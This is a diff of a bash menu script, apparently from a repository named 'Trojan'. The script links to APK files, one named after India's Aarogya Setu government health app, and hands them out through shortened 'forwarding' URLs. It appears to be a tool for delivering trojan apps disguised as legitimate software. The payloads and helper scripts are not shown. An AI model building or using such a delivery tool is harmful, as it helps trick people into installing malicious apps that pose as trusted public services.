@@ -43,39 +43,52 @@ printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m'
         read char
         if [[ $char = "1" ]] || [[ $char = "01" ]]
         then echo
-echo 'You will redirect to site...' | lolcat
-sleep 2.0
-xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
-echo
+cd .files && bash config.sh
+sleep 0.8
+echo -e '\033[1;92mForwarding link: \033[0mhttps://tinyurl.com/y7ufkdfs'
 sleep 0.2
-echo -e '\033[0;32mForwarding link: \033[0;37mhttps://tinyurl.com/y7ufkdfs'
+echo
+printf '\033[1m[?] Are you want to Download with External Sources ? [Y/n] ' | lolcat -a -d 1 -s 100 -t
+read ask
+if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
+        then echo
+sleep 0.8
+echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 100
+xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
+else cd - && bash trojan.sh
+fi
+echo
 sleep 1.0
 printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
 read a1
-cd $HOME/Trojan/
 bash trojan.sh
 
         elif [[ $char = "2" ]] || [[ $char = "02" ]]
         then echo
-echo 'You will redirect to site...' | lolcat
-sleep 2.0
-xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
-echo
+cd .files && bash config+.sh
+echo -e '\033[0;92mForwarding link: \033[0mhttps://tinyurl.com/y8rm36ux'
 sleep 0.2
-echo -e '\033[0;32mForwarding link: \033[0;37mhttps://tinyurl.com/y8rm36ux'
-sleep 1.0
+echo
+printf '\033[1m[?] Are you want to Download with External Sources ? [Y/n] ' | lolcat -a -d 1 -s 100 -t
+read ask
+if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
+        then echo
+sleep 0.8
+echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 
+xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
+else cd - && bash trojan.sh
+fi
+echo
+sleep 1
 printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
 read a1
-cd $HOME/Trojan/
 bash trojan.sh
 
         elif [[ $char = "3" ]] || [[ $char = "03" ]]
         then
 echo
-echo 'Updating Please wait...' | lolcat -a
-cd $HOME
-rm -rf Trojan
-git clone https://github.com/abhackerofficial/Trojan > /dev/null 2>&1 && cd Trojan && bash trojan.sh
+echo 'Updating Please wait...' | lolcat -a -d 1 -t -s 100
+cd .files && bash update.sh
 
         elif [[ $char = "4" ]] || [[ $char = "04" ]]
         then
